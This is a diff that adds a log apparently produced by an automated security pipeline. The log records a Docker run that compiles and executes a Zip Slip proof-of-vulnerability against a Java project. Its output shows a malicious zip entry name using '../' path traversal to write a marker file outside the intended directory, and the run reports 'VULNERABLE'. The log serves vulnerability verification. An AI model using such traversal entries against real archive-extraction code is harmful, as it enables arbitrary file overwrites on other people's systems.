@@ -1,0 +1,16 @@
+$ docker run --rm -v /Users/mohsen/dev/personal/autosec/security_pipeline_runs/20260717_024644_finding-9cd89dec9b04/worktree:/workspace/repo -w /workspace/repo simpleautosec-finding-9cd89dec9b04:ec49b32dada6 bash -lc mvn -q -o -DskipTests compile && SLF4J=/root/.m2/repository/org/slf4j/slf4j-api/1.6.6/slf4j-api-1.6.6.jar && mkdir -p /tmp/pov-classes && javac -cp "target/classes:$SLF4J" -d /tmp/pov-classes .security-pipeline/pov/ZipSlipPOV.java && java -cp "/tmp/pov-classes:target/classes:$SLF4J" ZipSlipPOV
+exit_code=0
+timed_out=false
+
+--- stdout ---
+[pov] malicious zip: /tmp/zipslip-pov.zip
+[pov] malicious entry name: ../../../../../../../../../../../../tmp/zipslip-pov-escaped-marker/pwned.txt
+[pov] intended output dir: /tmp/zipslip-pov-safe-outputdir
+[pov] out-of-bounds target: /tmp/zipslip-pov-escaped-marker/pwned.txt
+[pov] VULNERABLE: entry escaped outputDir and wrote to /tmp/zipslip-pov-escaped-marker/pwned.txt
+
+--- stderr ---
+SLF4J: Failed to load class "org.slf4j.impl.StaticLoggerBinder".
+SLF4J: Defaulting to no-operation (NOP) logger implementation
+SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.
+
